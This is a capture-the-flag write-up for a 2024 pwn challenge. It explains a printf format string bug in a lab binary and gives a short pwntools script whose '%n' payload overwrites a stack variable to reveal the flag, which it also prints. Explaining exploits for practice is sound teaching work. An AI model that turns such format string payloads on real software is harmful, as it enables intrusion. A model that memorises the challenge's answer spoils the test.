# Cyber Apocalypse 2024

## Delulu

> HALT! Recognition protocol initiated. Please present your face for scanning.
> 
> Author: w3th4nds
> 
> [`pwn_delulu.zip`](pwn_delulu.zip)

Tags: _pwn_

## Solution
The challenges comes with a binary. Checking what security measurements are in place, we can see that pretty much everything is enabled.

```bash
$ checksec delulu
[*] '/home/ctf/cyber/pwn/delulu/challenge/delulu'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./glibc/'
```

Let's see what the program actually does. The user is prompted to input some text. Since the read is limited, we don't have a buffer overflow here. Then the input text is printed by calling `printf`. Since the buffer is just passed to printf this calls for a [`format string attack`](https://ir0nstone.gitbook.io/notes/types/stack/format-string).

The flag is printed to us in function `delulu` and this function is only called when the variable `local_48` has value `0x1337beef`. Since the variable was initialized with `0x1337babe` the flag is not printed as per default.

```c
undefined8 main(void)
{
  long in_FS_OFFSET;
  long local_48;
  long *local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_48 = 0x1337babe;
  local_40 = &local_48;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  read(0,&local_38,0x1f);
  printf("\n[!] Checking.. ");
  printf((char *)&local_38);
  if (local_48 == 0x1337beef) {
    delulu();
  }
  else {
    error("ALERT ALERT ALERT ALERT\n");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

Now, printf has an interesting [`format specifier`](https://cplusplus.com/reference/cstdio/printf/) that allows us to write `The number of characters written so far is stored in the pointed location`. So there is one thing we need, we need a pointer to `local_48` and luckily enough, we just have this pointer with `local_40`. 

Now we need to check the offset of our target pointer on the stack when printf is invoked. We can do this by inserting a lot of `%p%p%p%p` ... and checking at which position the pointer is printed (the pointer we can find with gdb). Turns out it's at offset `7`, so or payload looks like this:

```py
from pwn import *

p = remote("94.237.60.170", 42887)
payload = b"%322420463x%7$n"
p.sendline(payload)

while True:
    foo = p.recv().strip()
    if len(foo) != 0:
        print(foo.strip())
```

Running this, gives us the flag.

Flag `HTB{m45t3r_0f_d3c3pt10n}`